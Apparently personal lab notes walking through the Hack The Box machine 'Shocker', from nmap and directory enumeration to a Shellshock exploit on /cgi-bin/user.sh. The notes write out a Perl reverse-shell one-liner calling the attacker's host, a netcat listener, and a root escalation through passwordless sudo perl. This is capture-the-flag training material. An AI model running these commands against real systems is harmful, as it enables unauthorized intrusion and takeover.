**Ping**
```
ping 10.10.10.56
```
![[Pasted image 20240611160304.png]]

**Nmap default Scan**
```
nmap 10.10.10.56 -sC -sV -oN snmap
```
![[Pasted image 20240611160429.png]]

**All port Scan** 
```
nmap 10.10.10.56 -p- --open -T5 -sC -sV -oN anmap
```
![[Pasted image 20240611160806.png]]

**Port 80**
![[Pasted image 20240611160822.png]]

**Gobuster on port 80**
```
gobuster dir -u http://10.10.10.56// -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster.txt
```
![[Pasted image 20240611162240.png]]
Nothing Interesting.

Using dirb
```
dirb http://10.10.10.56 -o dirb.txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```
![[Pasted image 20240611162400.png]]
We have found a new directory /cgi-bin

Will exploit the cgi-bin also we can add .sh and .cgi extensions in Gobuster
```
gobuster dir -u http://10.10.10.56/cgi-bin -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,html,txt,bak,conf,sh,cgi -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster_cgi-bin.txt
```
![[Pasted image 20240611162221.png]]
We found a new file user.sh

The new directory, downloads a file 
![[Pasted image 20240611162619.png]]





Content of user.sh
![[Pasted image 20240611164147.png]]
We can use this /cgi-bin/user.sh as shellshock code 

Will find exploit for cgi-bin
![[Pasted image 20240611164243.png]]

We found one from Exploit-db https://www.exploit-db.com/exploits/34900
![[Pasted image 20240611164320.png]]

Slightly modified the exploit code according to our need
![[Pasted image 20240611164420.png]]
Included vulnerable directory

Then ran the exploit
```
python2 exp.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.7 lport=443
```
![[Pasted image 20240611164515.png]]
We got RCE, will get reverse shell now


Reverse shell using Perl
```
perl -e 'use Socket;$i="10.10.14.7";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```
![[Pasted image 20240611164620.png]]

```
rlwrap nc -nvlp 4444
```
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240611164712.png]]
Got reverse shell and upgraded my shell to interactive using python 3.

Got user.txt
![[Pasted image 20240611164842.png]]


Let's Strat with sudo permissions
```
sudo -l
```
![[Pasted image 20240611165110.png]]
Perl has sudo privilege with no password

Will exploit this to escalate our privilege
```
sudo perl -e 'exec "/bin/sh";'
```
![[Pasted image 20240611165418.png]]
We are in as root now

We got our root flag
![[Pasted image 20240611165502.png]]





That's it, we are done with Shocker....:)